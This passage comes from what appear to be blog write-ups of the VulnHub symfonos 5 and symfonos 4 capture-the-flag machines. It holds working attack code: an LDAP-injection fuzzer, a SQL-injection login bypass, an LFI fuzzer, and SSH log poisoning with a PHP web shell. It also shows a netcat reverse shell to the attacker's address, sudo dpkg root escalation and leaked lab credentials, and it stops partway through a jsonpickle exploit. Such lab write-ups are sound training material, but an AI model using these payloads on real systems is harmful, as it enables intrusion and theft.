<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">target</span><span class="o">=</span><span class="s">"http://192.168.179.140"</span>

<span class="k">def</span> <span class="nf">login_ldap</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">u</span><span class="p">):</span>
    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/admin.php?username=</span><span class="si">{</span><span class="n">u</span><span class="si">}</span><span class="s">&amp;password=123"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"LDAP_FUZZ.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">login_ldap</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">w</span><span class="p">):</span><span class="mi">5</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">w</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Then I run the script and we see a different value in the length of the request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 ldap_fuzz.py
... 
1663 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">)(</span>&amp;           
 962 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">))</span>%00  
1663 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">()</span>|%26<span class="s1">'
...
</span></code></pre></div></div>

<p>We check this, and managed to bypass this login page.</p>

<p><img src="/assets/images/symfonos5/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/symfonos5/screenshot-4.png" alt="" /></p>

<p>Poked around the web application, in the home resource we see that it is calling the <strong>url</strong> parameter and including a url.</p>

<p><img src="/assets/images/symfonos5/screenshot-5.png" alt="" /></p>

<p>So I tried to test for Remote File Inclusion but this doesn’t work, then I include the <strong>/etc/passwd</strong> file and works. 
<img src="/assets/images/symfonos5/screenshot-6.png" alt="" /></p>

<p>Subsequently I decided use wrappers to see de source code of the <strong>home.php</strong> file, and the function that it’s using to include files is <strong>file_get_contents</strong>, for this reason it was not possible to exploit the File Inclusion vulnerability, since with this function it is not possible to execute php code.</p>

<p>Then I tried to see the content of the <strong>admin.php</strong> file, for this we need the session cookie, we intercept the request with burpsuite and copy the cookie for then include it in our curl request, as shown below:</p>

<p><img src="/assets/images/symfonos5/screenshot-7.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=l858dt8bk4coinqvjcskmutsg9"</span> <span class="s2">"http://192.168.179.140/home.php?url=php://filter/convert.base64-encode/resource=admin.php"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'^\w[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>admin.php
...
<span class="nv">$bind</span> <span class="o">=</span> ldap_bind<span class="o">(</span><span class="nv">$ldap_ch</span>, <span class="s2">"cn=admin,dc=symfonos,dc=local"</span>, <span class="s2">"qMDdyZh3cT6eeAWD"</span><span class="o">)</span><span class="p">;</span>
...
</code></pre></div></div>
<p>In the output we can see the connection credentials for LDAP, With this We’ll try to enumerate the LDAP service on port 389.</p>

<h3 id="ldap-enumeration">LDAP Enumeration</h3>
<p>With the <strong>ldapsearch</strong> utility we can try to enumerate for user credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 192.168.179.140 <span class="nt">-x</span> <span class="nt">-D</span> <span class="s2">"cn=admin,dc=symfonos,dc=local"</span> <span class="nt">-b</span> <span class="s2">"dc=symfonos,dc=local"</span> <span class="nt">-W</span>
Enter LDAP Password: 
...
<span class="c"># admin, symfonos.local</span>
dn: <span class="nv">cn</span><span class="o">=</span>admin,dc<span class="o">=</span>symfonos,dc<span class="o">=</span><span class="nb">local
</span>objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: <span class="nv">e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0</span><span class="o">=</span>

<span class="c"># zeus, symfonos.local</span>
dn: <span class="nv">uid</span><span class="o">=</span>zeus,dc<span class="o">=</span>symfonos,dc<span class="o">=</span><span class="nb">local
</span>uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: <span class="nv">Y2V0a0tmNHdDdUhDOUZFVA</span><span class="o">==</span>
mail: zeus@symfonos.local
gecos: Zeus User
...
</code></pre></div></div>
<p>As we see in the above results the, <strong>zeus</strong> username and password was revelated, the password is base64 encoded, so let’s decode it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Y2V0a0tmNHdDdUhDOUZFVA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>cetkKf4wCuHC9FET
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>
<p>With the <strong>zeus</strong> user and the decoded password we log in to the SSH service, then we enumerate for the sudo permissions and we see that the <strong>dpkg</strong> command can be executed as root without password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh zeus@192.168.179.140
zeus@192.168.179.140<span class="s1">'s password:
zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg
</span></code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="dpkg-sudo-permissions">dpkg Sudo Permissions</h3>
<p>dpkg is a tool to install, build, remove and manage, packages. With this utility an attacker can install malicious software or elevate privileges to root.</p>

<p>With the following instruction we list packages in a less format, then we invoke a bash shell and finally we get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zeus@symfonos5:~<span class="nv">$ </span><span class="nb">sudo </span>dpkg <span class="nt">-l</span>
<span class="nv">Desired</span><span class="o">=</span>Unknown/Install/Remove/Purge/Hold  
| <span class="nv">Status</span><span class="o">=</span>Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?<span class="o">=(</span>none<span class="o">)</span>/Reinst-required <span class="o">(</span>Status,Err: <span class="nv">uppercase</span><span class="o">=</span>bad<span class="o">)</span>
...
<span class="o">!</span>/bin/bash
root@symfonos5:/home/zeus# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - symfonos 4</h1>
	<p class="post-date text-bold text-upcase">
	<span>June 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> OSCP-like Intermediate real life based machine designed to teach people the importance of trying harder.</p>

<p><strong>Author:</strong> Zayotic</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/symfonos-4,347/">https://www.vulnhub.com/entry/symfonos-4,347/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>We start by discovering our target machine with <strong>arp-scan</strong>, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.138 08:00:27:79:ce:89       PCS Systemtechnik GmbH
192.168.179.254 00:50:56:f5:4d:f3       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>
<p>Discovered the IP address of our target, I proceed to perform a full TCP scan.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p-</span> 192.168.179.138 <span class="nt">-oG</span> tcp-all-ports.txt
...
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:79:CE:89 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="sevice-enumeration">Sevice Enumeration</h3>
<p>Then proceed to enumerate the TCP open ports versions and services with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p22</span>,80 192.168.179.138 <span class="nt">-oN</span> nmap-service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f <span class="o">(</span>RSA<span class="o">)</span>
|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>
<p>Browsing the web page I didn’t find anything, so I run gobuster to find directories and files using brute force.</p>

<p><img src="/assets/images/symfonos4/screenshot-1.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.138/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> txt,html,php
...
http://192.168.179.138/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 201]
http://192.168.179.138/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/css/]
http://192.168.179.138/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/manual/]
http://192.168.179.138/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/js/]    
http://192.168.179.138/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 323] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/javascript/]
http://192.168.179.138/robots.txt           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 300]                                         
http://192.168.179.138/sea.php              <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> atlantis.php]                        
http://192.168.179.138/atlantis.php         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1718]                                        
http://192.168.179.138/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]                                         
http://192.168.179.138/gods                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.138/gods/]
...
</code></pre></div></div>
<p>In the output we can see the <strong>atlantis.php</strong> file this contains a login page.</p>

<p><img src="/assets/images/symfonos4/screenshot-2.png" alt="" /></p>

<p><strong>SQL Injection to Bypass Authentication</strong></p>

<p>Testing the web form I found that it’s vulnerable to SQL Injection, so I bypassed the login page with the following SQL statement:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 #
</span></code></pre></div></div>

<p><img src="/assets/images/symfonos4/screenshot-3.png" alt="" /></p>

<p><img src="/assets/images/symfonos4/screenshot-4.png" alt="" /></p>

<p>This page allows us request for a god and returns a description about it, if we remember in the gobuster results we found the directory <strong>gods</strong>, this contains the gods that are being included in the web page.</p>

<p><img src="/assets/images/symfonos4/screenshot-5.png" alt="" /></p>

<p><strong>Local File Inclusion</strong></p>

<p>If we notice that the <strong>.log</strong> extension is not included at the time of requesting a god, so I decided to test Local File Inclusion vulnerability, but removing the .log extension from the word list, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="s1">'s/\.log$//g'</span> /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt <span class="o">&gt;</span> wordlist.txt
</code></pre></div></div>
<p>Therefore I decided develop a python script, which will help me find a file that can be included in the parameter <strong>file</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">target</span><span class="o">=</span><span class="s">"http://192.168.179.138/atlantis.php"</span>
<span class="n">payload</span><span class="o">=</span><span class="s">"' or 1=1 #"</span>
<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">sqli</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">values</span><span class="o">=</span><span class="p">{</span>
            <span class="s">'username'</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
            <span class="s">'password'</span><span class="p">:</span><span class="s">'password'</span>
            <span class="p">}</span>

    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">values</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">lfi_fuzz</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
    <span class="n">lfi_req</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"http://192.168.179.138/sea.php?file=../../../../../../</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">lfi_req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"wordlist.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">sqli</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="n">x</span><span class="o">=</span><span class="n">lfi_fuzz</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">x</span> <span class="o">!=</span> <span class="mi">577</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">p</span><span class="p">:</span><span class="mi">50</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">p</span><span class="p">:</span><span class="mi">50</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>

</code></pre></div></div>

<p>Then we run our script and we can see that the ssh log file is possible to include.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 lfi.py
4706 /var/log/auth                                     
274347 /var/log/dpkg
</code></pre></div></div>

<p><img src="/assets/images/symfonos4/screenshot-6.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="ssh-log-poisoning">SSH Log Poisoning</h3>
<p>This is a technique that allows the attacker to inject malicious code into the ssh registry, keeping this in mind, we inject the system function as username, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> <span class="s1">'&lt;?php system($_GET[cmd]); ?&gt;'</span> 192.168.179.138
&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>cmd]<span class="o">)</span><span class="p">;</span> ?&gt;@192.168.179.138<span class="s1">'s password:
</span></code></pre></div></div>
<p>With curl we’ll try to request the ssh log but adding as parameter a system command, in this case we can see that the commad <strong>id</strong> is executed correctly, then we verify that netcat exists and thus obtain a reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> POST <span class="nt">-c</span> cookies_file.txt <span class="s2">"http://192.168.179.138/atlantis.php"</span> <span class="nt">--data</span> <span class="s2">"username=admin'+or+1%3d1+%23&amp;password=password"</span> 

root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=id"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span>
<span class="k">for </span>invalid user <span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> from 192.168.179.1
port 38056 ssh2

root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=whereis%20nc"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span> 
password <span class="k">for </span>invalid user nc: /usr/bin/nc.traditional /usr/bin/nc /usr/share/man/man1/
nc.1.gz from 192.168.179.1 port 38056 ssh2
</code></pre></div></div>

<p><strong>Getting a reverse shell</strong></p>

<p>First we set up a netcat listener on port 443, and then we run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">-b</span> cookies_file.txt <span class="s2">"http://192.168.179.138/sea.php?file=../../../../../../../var/log/auth&amp;cmd=nc%20192.168.179.1%20443%20-e%20/bin/bash"</span> | html2text <span class="nt">-width</span> 90 | <span class="nb">tail</span> <span class="nt">-2</span>
</code></pre></div></div>

<p>As we can see, we get a reverse shell with limited permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.138] 46544
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
www-data@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
<span class="nb">uname</span> <span class="nt">-a</span>
Linux symfonos4 4.19.0-5-686 <span class="c">#1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686 GNU/Linux</span>
</code></pre></div></div>

<p><strong>Enumerating Services</strong></p>

<p>In the obtained result we see that the port 3306 belonging to MySQL and the port 8080 possibly a web application are running locally.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/<span class="nv">$ </span>ss <span class="nt">-antl</span>
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    
LISTEN    0         80               127.0.0.1:3306             0.0.0.0:<span class="k">*</span>       
LISTEN    0         128              127.0.0.1:8080             0.0.0.0:<span class="k">*</span>       
LISTEN    0         128                0.0.0.0:22               0.0.0.0:<span class="k">*</span>       
LISTEN    0         128                      <span class="k">*</span>:80                     <span class="k">*</span>:<span class="k">*</span>       
LISTEN    0         128                   <span class="o">[</span>::]:22                  <span class="o">[</span>::]:<span class="k">*</span>
</code></pre></div></div>

<p><strong>MySQL credentials</strong></p>

<p>The <strong>atlantis.php</strong> file located in the document root I found the MySQL credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-n</span> 5 atlantis.php
&lt;?php
   define<span class="o">(</span><span class="s1">'DB_USERNAME'</span>, <span class="s1">'root'</span><span class="o">)</span><span class="p">;</span>
   define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'yVzyRGw3cG2Uyt2r'</span><span class="o">)</span><span class="p">;</span>
   <span class="nv">$db</span> <span class="o">=</span> new PDO<span class="o">(</span><span class="s2">"mysql:host=localhost:3306;dbname=db"</span>, DB_USERNAME,DB_PASSWORD<span class="o">)</span><span class="p">;</span>
</code></pre></div></div>

<p>With the MySQL password I switch to poseidon user as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@symfonos4:/var/www/html<span class="nv">$ </span>su poseidon
Password: yVzyRGw3cG2Uyt2r

poseidon@symfonos4:/var/www/html<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>poseidon<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>bluetooth<span class="o">)</span>
</code></pre></div></div>

<p><strong>Enumerating running Processes</strong></p>

<p>Listing the processes, I found the service on port 8080 is running with root permissions, this is interesting because we could escalate our privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/var/www/html<span class="nv">$ </span>ps aux | <span class="nb">grep </span>root
...
root       559  0.5  3.4  28264 17704 ?        S    19:37   1:01 /usr/bin/python /usr/local/bin/gunicorn <span class="nt">--workers</span> 3 <span class="nt">-b</span> 127.0.0.1:8080 app:app
...
</code></pre></div></div>

<h3 id="local-port-forwarding">Local Port Forwarding</h3>

<p>Then I performed a local port forwarding, this means that all data sent to port 4444 on attacking machine is forwarded to port 8080 on target host, as shown below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 4444:127.0.0.1:8080 <span class="nt">-l</span> poseidon 192.168.179.138

root@kali:~<span class="nv">$ </span>ss <span class="nt">-antl</span> | <span class="nb">grep </span>4444
LISTEN 0      128        127.0.0.1:4444      0.0.0.0:<span class="k">*</span>          
LISTEN 0      128            <span class="o">[</span>::1]:4444         <span class="o">[</span>::]:<span class="k">*</span> 
</code></pre></div></div>

<p>Poked around the web page and found nothing interesting, I went to the system to locate the web application that is running locally on port 8080 on the target machine.</p>

<p><img src="/assets/images/symfonos4/screenshot-7.png" alt="" /></p>

<p><img src="/assets/images/symfonos4/screenshot-8.png" alt="" /></p>

<p>In the <strong>/opt/code</strong> directory I found some python files, reviewing the <strong>app.py</strong> file I identify that it’s importing the <strong>jsonpickle</strong> module.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/opt/code<span class="nv">$ </span><span class="nb">ls
</span>app.py  app.pyc  static  templates  wsgi.pyc
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>poseidon@symfonos4:/opt/code<span class="nv">$ </span><span class="nb">cat </span>app.py
from flask import Flask, request, render_template, current_app, redirect

import jsonpickle
import <span class="nb">base64

</span>app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>

class User<span class="o">(</span>object<span class="o">)</span>:

    def __init__<span class="o">(</span>self, username<span class="o">)</span>:
        self.username <span class="o">=</span> username


@app.route<span class="o">(</span><span class="s1">'/'</span><span class="o">)</span>
def index<span class="o">()</span>:
    <span class="k">if </span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)</span>:
        u <span class="o">=</span> jsonpickle.decode<span class="o">(</span>base64.b64decode<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)))</span>
        <span class="k">return </span>render_template<span class="o">(</span><span class="s2">"index.html"</span>, <span class="nv">username</span><span class="o">=</span>u.username<span class="o">)</span>
    <span class="k">else</span>:
        w <span class="o">=</span> redirect<span class="o">(</span><span class="s2">"/whoami"</span><span class="o">)</span>
        response <span class="o">=</span> current_app.make_response<span class="o">(</span>w<span class="o">)</span>
        u <span class="o">=</span> User<span class="o">(</span><span class="s2">"Poseidon"</span><span class="o">)</span>
        encoded <span class="o">=</span> base64.b64encode<span class="o">(</span>jsonpickle.encode<span class="o">(</span>u<span class="o">))</span>
        response.set_cookie<span class="o">(</span><span class="s2">"username"</span>, <span class="nv">value</span><span class="o">=</span>encoded<span class="o">)</span>
        <span class="k">return </span>response


@app.route<span class="o">(</span><span class="s1">'/whoami'</span><span class="o">)</span>
def <span class="nb">whoami</span><span class="o">()</span>:
    user <span class="o">=</span> jsonpickle.decode<span class="o">(</span>base64.b64decode<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s2">"username"</span><span class="o">)))</span>
    username <span class="o">=</span> user.username
    <span class="k">return </span>render_template<span class="o">(</span><span class="s2">"whoami.html"</span>, <span class="nv">username</span><span class="o">=</span>username<span class="o">)</span>


<span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    app.run<span class="o">()</span>
</code></pre></div></div>

<p>Searching for vulnerabilities with searchsploit, I found that the <strong>jsonpickle</strong> module is vulnerable to Remote Code Execution, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit jsonpickle                 
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
 Exploit Title                                              |  Path
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
python jsonpickle 2.0.0 - Remote Code Execution             | multiple/remote/49585.py
<span class="nt">------------------------------------------------------------</span> <span class="nt">---------------------------</span>
</code></pre></div></div>
<p>We transfer a copy of the exploit to our current directory, and we analyze the proof of concept to exploit this vulnerability, this security flaw consists if malicious data is deserialized, it will execute arbitrary Python commands, the problem is in the inner function loadrepr function which eval each serialized string which contains “py/repr”, to know more obout this vulnerability you can find it <a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> multiple/remote/49585.py


root@kali:~<span class="nv">$ </span><span class="nb">cat </span>49585.py
...
<span class="c">#       the pattern should be :</span>
<span class="c">#       {..{"py/repr":&lt;the module to import&gt;/&lt;the command to be executed.&gt;}..}</span>

<span class="c">#       example:</span>

